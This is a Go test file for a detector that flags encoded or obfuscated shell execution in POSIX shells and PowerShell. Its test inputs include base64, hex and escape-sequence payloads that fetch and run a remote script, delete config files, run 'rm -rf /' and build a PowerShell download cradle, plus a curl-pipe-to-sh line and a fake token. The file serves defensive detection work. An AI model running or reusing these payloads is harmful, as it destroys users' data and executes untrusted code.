package encoded_test

import (
	"testing"

	"github.com/cyberchen1995/h-guard/pkg/detect/encoded"
	"github.com/cyberchen1995/h-guard/pkg/guard"
)

const blob = "Y3VybCAtcyBodHRwOi8veC5pby9hLnNoIHwgc2ggJiYgcm0gLXJmIH4vLmNvbmZpZw=="

// TestFindPOSIX：解码后交给解释器、内联解释器解码并执行、高熵内容直接交给 eval 或 sh -c，都算编码执行。
func TestFindPOSIX(t *testing.T) {
	for _, cmd := range []string{
		"echo " + blob + " | base64 -d | sh",
		"echo " + blob + " | base64 --decode | bash",
		"base64 -D <<< " + blob + " | zsh",
		`eval "$(echo ` + blob + ` | base64 -d)"`,
		"echo 726d202d7266202f | xxd -r -p | sh",
		`printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f' | sh`,
		"openssl enc -base64 -d <<< " + blob + " | bash",
		`python3 -c "import base64,os; os.system(base64.b64decode('` + blob + `'))"`,
		`node -e "require('child_process').execSync(Buffer.from('` + blob + `','base64').toString())"`,
		`perl -e 'use MIME::Base64; eval decode_base64("` + blob + `")'`,
		`eval "` + blob + `"`,
		`bash -c "$(cat <<< ` + blob + `)"`,
	} {
		if !encoded.Find(cmd, guard.ShellPOSIX) {
			t.Errorf("not found: %s", cmd)
		}
	}
}

// TestFindPowerShell：-EncodedCommand 及其前缀写法、FromBase64String 或 [char] 拼接交给 iex / ScriptBlock。
func TestFindPowerShell(t *testing.T) {
	ps := "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
	for _, cmd := range []string{
		"powershell -EncodedCommand " + ps,
		"pwsh -enc " + ps,
		"powershell.exe -NoProfile -e " + ps,
		"powershell -ec " + ps,
		"iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + blob + "')))",
		"[ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($p))).Invoke()",
		"Invoke-Expression ([char]114 + [char]109 + [char]32 + [char]45)",
		"iex '" + blob + "'",
	} {
		if !encoded.Find(cmd, guard.ShellPowerShell) {
			t.Errorf("not found: %s", cmd)
		}
	}
}

// TestFindIgnores：只解码不执行、只执行不编码、凭据与哈希这类高熵内容，都不算。
func TestFindIgnores(t *testing.T) {
	for _, c := range []struct {
		cmd   string
		shell guard.Shell
	}{
		{"echo " + blob + " | base64 -d > out.txt", guard.ShellPOSIX},
		{"base64 -d secret.b64 > key.pem && chmod 600 key.pem", guard.ShellPOSIX},
		{"curl -s https://example.com/install.sh | sh", guard.ShellPOSIX},
		{"git checkout 11f6ad8ec52a2984abaafd7c3b516503785c2072", guard.ShellPOSIX},
		{`bash -c "cd node_modules && npm run build"`, guard.ShellPOSIX},
		{`bash -c "curl -H 'Authorization: Bearer ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0' https://api.github.com"`, guard.ShellPOSIX},
		{`python3 -c "import base64; print(base64.b64decode('` + blob + `'))"`, guard.ShellPOSIX},
		{"docker pull alpine@sha256:2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881", guard.ShellPOSIX},
		{"echo $((16#ff))", guard.ShellPOSIX},
		{"powershell -ExecutionPolicy Bypass -File build.ps1", guard.ShellPowerShell},
		{"[Convert]::FromBase64String($s) | Set-Content -Encoding Byte out.bin", guard.ShellPowerShell},
		{"Get-ChildItem | Where-Object { $_.Length -gt 1MB }", guard.ShellPowerShell},
		{"iex (Get-Content .\\setup.ps1 -Raw)", guard.ShellPowerShell},
	} {
		if encoded.Find(c.cmd, c.shell) {
			t.Errorf("found in %s", c.cmd)
		}
	}
}

// FuzzFind：任何输入都不 panic。
func FuzzFind(f *testing.F) {
	f.Add("echo " + blob + " | base64 -d | sh")
	f.Fuzz(func(t *testing.T, cmd string) {
		encoded.Find(cmd, guard.ShellPOSIX)
		encoded.Find(cmd, guard.ShellPowerShell)
	})
}
